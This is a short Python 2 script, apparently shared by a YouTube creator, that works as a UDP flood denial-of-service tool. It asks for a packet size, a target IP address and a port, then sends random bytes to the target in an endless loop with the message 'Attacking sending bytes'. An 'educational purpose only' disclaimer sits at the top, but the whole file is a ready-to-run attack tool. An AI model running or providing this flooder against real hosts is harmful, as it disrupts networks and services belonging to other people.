import sys
import os
import random
import socket




########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################


"""
Created By: TheTechHacker
==========================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ

"""
print "\033[1;32m"

os.system("clear")
connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
     _      _      _
    (.)< __(.)> __(.)=
  \___)  \___)  \___)   Ready To Send
  
  
=======================================
     Created By: TheTechHacker
=======================================
If You Use 1000 bytes or higher 
You're Internet might get a bit slow
=======================================
"""

try:
    size = input("bytes> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("port> ")
    print " "
    print "Lunching Attack"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")

while True:
    try:
        connect.sendto(attack, (ip, port))
        print "Attacking sending bytes ===>"
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")
print "\033[1;m"